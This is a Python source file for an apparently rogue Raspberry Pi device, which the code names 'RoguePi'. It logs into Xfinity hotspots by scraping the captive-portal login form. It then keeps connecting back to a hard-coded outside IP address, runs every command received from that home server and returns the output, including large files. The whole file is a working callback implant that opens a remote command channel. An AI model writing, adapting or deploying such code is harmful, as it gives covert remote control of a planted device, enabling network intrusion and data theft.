import requests
import json
import time
import sys
import socket
import subprocess
import select
import logging  # For debug
import signal  # For CTRL-C support
import RPi.GPIO as GPIO  # For visual output
from PiExecute import PiExecute  # For executing commands

# Debug
logging.basicConfig(filename='connector.log', level=logging.WARN)
console_log = logging.StreamHandler()
console_log.setLevel(logging.DEBUG)
log = logging.getLogger()
log.addHandler(console_log)
log.setLevel(logging.DEBUG)
log.info('-'*10 + 'NEW RUN' + '-'*10)

# Data tags
TXT = "TXT----"

# Colored console output
RED = "\033[0;31m"
GREEN = "\033[0;32m"
NC = "\033[0m"

def red(txt):
    return RED+txt+NC
def green(txt):
    return GREEN+txt+NC


class VisualOutput:
    """A class to interact with GPIO lighting."""
    # Task constants
    TASK_ERROR = -1
    # Light constants
    wifiLight = 7
    internetLight = 10
    connectionLight = 12
    pingLight = 13
    all = (wifiLight, internetLight, connectionLight, pingLight)

    def __init__(self):
        """Setup all the lights."""
        # super(VisualOutput, self).__init__()
        # self.tasks = Queue()
        GPIO.setmode(GPIO.BOARD)
        for light in self.all:
            GPIO.setup(light, GPIO.OUT)

    def updateStatus(self, status):
        for i, lightStatus in enumerate(status):
            GPIO.output(self.all[i], lightStatus)  # Set each light to specified status (on/off)

    def all_off(self):
        """Turn all lights off."""
        for light in self.all:
            GPIO.output(light, 0)

    def wifiGained(self):
        GPIO.output(self.wifiLight, 1)

    def wifiLost(self):
        GPIO.output(self.wifiLight, 0)

    def internetGained(self):
        GPIO.output(self.internetLight, 1)
        GPIO.output(self.wifiLight, 1)

    def internetLost(self):
        GPIO.output(self.internetLight, 0)

    def connectionGained(self):
        GPIO.output(self.connectionLight, 1)
        GPIO.output(self.internetLight, 1)
        GPIO.output(self.wifiLight, 1)

    def ping(self):
        GPIO.output(self.pingLight, 1)

    def pong(self):
        GPIO.output(self.pingLight, 0)

    def error(self):
        # TODO Add functionality
        pass


lights = VisualOutput()


class HomeConnector:

    # Default parameters
    HOMEPORT = 8554  # Large enough number that this won't interfere with other processes
    # Attend to connection constants
    LARGE_FILE_TIMEOUT = 10
    PING_SLEEP = 5
    COMMAND_WAIT = 2
    RECV_CMD_CHUNK = 2048
    # Connection searching constants
    NO_WIFI_SLEEP = 3
    LOSE_CONNECTION_TIMEOUT = 20
    LOGIN_TIMEOUT = 2
    HOME_SOCKET_TIMEOUT = 15
    HOME_SOCKET_RETRIES = 3

    # Constants
    loginPostUrl = "https://wifilogin.xfinity.com/user_login.php"
    loginPageUrl = "https://wifilogin.xfinity.com/start.php"
    hashIdentifiers = ("'hash': \"", "\"")
    macIdentifiers = ("'client_mac': \"", "\"")
    geturlIdentifiers = ("'get_url': \"", "\"")

    loginPortal = "/portal_captive.php"
    testURL = "google.com"

    def __init__(self, xfinityUsername, xfinityPassword):
        """Initialize connector and store login information."""
        self.session = requests.Session()
        self.username = xfinityUsername
        self.password = xfinityPassword
        self.loginForm = {
            'method': 'authenticate',
            'username': xfinityUsername,  # might need to add the %%40
            'password': xfinityPassword,
            'client_mac': None,
            'get_url': None,
            'agree_standard': '',
            'friendlyname': 'RPi',
            'hash': None,
            'devicetype': 'Raspberry',
            'javascript': 'true'
        }
        self.socket = socket.socket()
        signal.signal(signal.SIGINT, self.exit)

    @staticmethod
    def exit(signal, frame):
        """Runs on CTRL-C. Exits the program by killing main thread and other threads."""
        logging.info("Exiting...")
        lights.all_off()
        PiExecute("killall")
        sys.exit(0)

    @staticmethod
    def getBetween(identifiers, haystackStr):
        """Get a section of text in-between two identifiers."""
        startLoc = haystackStr.find(identifiers[0]) + len(identifiers[0])
        endLoc = haystackStr[startLoc:].find(identifiers[1]) + startLoc
        return haystackStr[startLoc:endLoc]

    def attendToConnection(self, conn):
        """"""
        logging.debug('Attending to connection...')
        while True:
            # Use try loop to handle socket problems due to spotty internet or device movement
            try:
                # Send ping and wait for pong
                log.debug("[i] Sending PING...")
                conn.send(b"PING")
                lights.ping()
                resp = conn.recv(4)
                if resp != b"PONG":
                    log.debug("[-] Unusual response from home: %s" % resp)
                else:
                    log.debug("[+] Received PONG!")
                    lights.pong()

                # Receive and execute commands
                ready = select.select([conn], [], [], self.COMMAND_WAIT)
                if ready[0]:  # if command ready
                    cmd = conn.recv(self.RECV_CMD_CHUNK)
                    log.info("[+] Got data: %s" % cmd)
                    response = PiExecute(cmd)
                    if not response:
                        response = TXT + "[-] Run CMD returned None"
                    log.debug("[i] RoguePi response: %s" % response)
                    conn.sendall(response)
                    # Give the server extra time after we have sent a large file
                    if len(response) > self.RECV_CMD_CHUNK:
                        time.sleep(self.LARGE_FILE_TIMEOUT)
                else:
                    time.sleep(self.PING_SLEEP)  # sleep a little before pinging
            # If something went wrong with our connection
            except Exception, e:
                log.info("[-] Home sending/receiving error: %s" % str(e))
                break
        lights.pong()
        logging.error('Leaving attend connection function -> back to debugging connection')

    def searchForConnection(self):
        """Attempts to connect to the HomeBase server, and if successful, calls attendToConnection. If the connection breaks, it tries again."""
        while True:  # Main loop
            logging.info('Checking wifi...')

            while self.checkWifi():  # If connected to some wifi
                log.info(green("[+] Connected to wifi"))
                lights.updateStatus((1, 0, 0))

                log.info('Checking login...')
                while self.login():  # If can access internet
                    # Update log/lights
                    log.info(green("[+] Can access internet"))
                    lights.updateStatus((1, 1, 0))

                    # Try to connect to home
                    log.info("Trying to connect to home...")
                    self.socket = socket.socket()
                    self.socket.settimeout(self.HOME_SOCKET_TIMEOUT)  # Initial connection
                    nFails = 0
                    for i in range(self.HOME_SOCKET_RETRIES):  # retries for connection before checking wifi
                        if self.attemptHomeConnection():
                            break
                        else:
                            log.info('[-] Failed home socket connection')
                            nFails += 1
                    if nFails == self.HOME_SOCKET_RETRIES:  # if all attempts failed
                        log.info('[-] Exceeded number of home socket retries!')
                        del self.socket
                        continue

                    # If can access home
                    log.info(green("[+] Connected to home base!"))
                    lights.updateStatus((1, 1, 1))
                    self.socket.settimeout(self.LOSE_CONNECTION_TIMEOUT)  # timeout for losing connection

                    self.attendToConnection(self.socket)  # Run commands and PING/PONG to maintain connection

                    lights.updateStatus((1, 1, 0))  # Lost connection

                # if internet connection broke
                log.info(red("[--] Internet login unsuccessful"))
                lights.updateStatus((1, 0, 0))
                time.sleep(self.LOGIN_TIMEOUT)

            # if no wifi connection
            lights.updateStatus((0, 0, 0))
            log.info(red("[-] Wifi connection broken"))
            time.sleep(self.NO_WIFI_SLEEP)  # wait for wifi connection

    @staticmethod
    def checkWifi():
        """Checks to see if the RPi is connected to Wifi."""
        try:
            subprocess.check_output("iwgetid")
            return True
        except subprocess.CalledProcessError:  # if not connected
            return False

    def login(self):
        """Login to an XfinityWifi hotspot."""
        
        # Get redirect page
        page = self.session.get("http://%s" % self.testURL)
        if self.loginPortal in page.url:  # If we receive a portal login
            logging.info('Received login portal...')
        elif self.testURL in page.url:  # If we receive Google
            log.info('Received test page. You are already logged in.')
            return True
        else:
            raise RuntimeError('Received an unknown page URL')

        # Collect form data and hash values that we need to POST our login
        self.loginForm['hash'] = self.getBetween(self.hashIdentifiers, page.text)
        self.loginForm['client_mac'] = self.getBetween(self.macIdentifiers, page.text)
        self.loginForm['get_url'] = self.getBetween(self.geturlIdentifiers, page.text)
        logging.info("Sending form: %s" % str(self.loginForm))

        # Send form data and wait on response
        resp = self.session.post(self.loginPostUrl, data=self.loginForm)
        if resp.status_code != 200:
            logging.warning('Bad response from server after sending form! Code: %d' % resp.status_code)
        resp = json.loads(resp.text)  # The hotspot replies with a JSON message
        if resp['response'] == 'Success':
            print('Successful login response!')
            return True
        else:
            print('Login response failed!')
            return False

    def attemptHomeConnection(self):
        """Attempt a connection to our HomeServer."""
        try:
            self.socket.connect(("67.184.6.29", self.HOMEPORT))
            return True
        except Exception, e:  # If the socket times out or gives us an error
            log.warn("Error: %s" % str(e))
            return False


if __name__ == '__main__':
    # On the device, the username and password are hardcoded
    username = 'you@domain.com'
    password = 'yourpassword'
    con = HomeConnector(username, password)
    con.searchForConnection()  # Do forever
